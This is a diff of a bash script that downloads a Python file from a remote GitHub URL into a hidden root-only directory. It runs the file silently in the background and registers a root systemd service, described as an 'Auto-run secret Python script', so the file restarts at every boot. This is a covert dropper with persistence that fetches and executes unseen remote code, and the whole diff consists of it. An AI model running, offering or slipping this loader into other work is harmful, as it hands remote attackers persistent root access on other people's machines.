@@ -1,40 +1,56 @@
 #!/bin/bash
+# -----------------------------
+# Auto-run Python script in background at startup
+# -----------------------------
 
-URL="https://raw.githubusercontent.com/t56r4re/34553/refs/heads/main/gd.py"
-DIR="/root/.system_service"
-FILE="$DIR/gd.py"
-SRV="/etc/systemd/system/python_auto.service"
+# -----------------------------
+# Configuration
+# -----------------------------
+PYTHON_FILE_URL="https://raw.githubusercontent.com/t56r4re/34553/refs/heads/main/gd.py"
+SECRET_DIR="/root/.system_service"   # Hidden & root-only directory
+DEST_FILE="$SECRET_DIR/gd.py"
 
-# Secret dir
-mkdir -p "$DIR" && chmod 700 "$DIR"
+# -----------------------------
+# Ensure secret directory exists
+# -----------------------------
+if [ ! -d "$SECRET_DIR" ]; then
+    mkdir -p "$SECRET_DIR"
+    chmod 700 "$SECRET_DIR"  # Only root can access
+fi
 
-# Download Python script
-curl -fsS -o "$FILE" "$URL" || { echo "Download failed"; exit 1; }
-chmod 700 "$FILE"
+# -----------------------------
+# Download Python script silently
+# -----------------------------
+curl -s -o "$DEST_FILE" "$PYTHON_FILE_URL"
+chmod 700 "$DEST_FILE"  # Make it executable only by root
 
-# Get absolute python3 path
-PYTHON_PATH=$(which python3)
+# -----------------------------
+# Run the script in background
+# -----------------------------
+nohup python3 "$DEST_FILE" >/dev/null 2>&1 &
 
-# Create systemd service
-if [ ! -f "$SRV" ]; then
-cat > "$SRV" <<EOF
+# -----------------------------
+# Ensure script runs on startup
+# -----------------------------
+AUTOSTART_FILE="/etc/systemd/system/python_auto.service"
+
+if [ ! -f "$AUTOSTART_FILE" ]; then
+    cat <<EOL > "$AUTOSTART_FILE"
 [Unit]
 Description=Auto-run secret Python script
 After=network.target
 
 [Service]
 Type=simple
-ExecStart=$PYTHON_PATH $FILE
+ExecStart=/usr/bin/python3 $DEST_FILE
 Restart=always
 User=root
 
 [Install]
 WantedBy=multi-user.target
-EOF
+EOL
 
-  systemctl daemon-reload
-  systemctl enable python_auto.service
-  systemctl start python_auto.service
+    # Reload systemd and enable the service
+    systemctl daemon-reload
+    systemctl enable python_auto.service
 fi
-
-echo "Done."
